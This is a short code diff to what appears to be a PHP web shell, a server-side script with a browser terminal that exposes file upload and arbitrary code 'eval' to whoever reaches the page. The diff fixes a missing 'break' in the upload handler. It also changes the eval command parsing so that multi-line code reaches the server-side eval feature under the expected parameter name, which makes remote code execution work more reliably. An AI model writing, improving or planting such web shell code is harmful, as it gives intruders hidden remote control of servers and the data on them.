@@ -187,6 +187,7 @@ if (isset($_GET["feature"])) {
             break;
         case 'upload':
             $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
+            break;
         case 'eval':
             $code = $_POST['code'];
             $response = featureEval($code, $_POST["cwd"]);
@@ -362,8 +363,8 @@ if (isset($_GET["feature"])) {
                 } else if (/^\s*clear\s*$/.test(command)) {
                     // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                     eShellContent.innerHTML = '';
-                } else if (/^\s*eval\s+[^\s]+\s*$/.test(command)) {
-                    makeRequest("?feature=eval", {cmd: command.match(/^\s*eval\s+([^\s]+)\s*$/)[1], cwd: CWD}, function (response) {
+                } else if (/^\s*eval\s+[\s\S]+\s*$/.test(command)) {
+                    makeRequest("?feature=eval", {code: command.match(/^\s*eval\s+([\s\S]+)\s*$/)[1], cwd: CWD}, function (response) {
                         if (response.hasOwnProperty('file')) {
                             featureDownload(response.name, response.file)
                         } else {
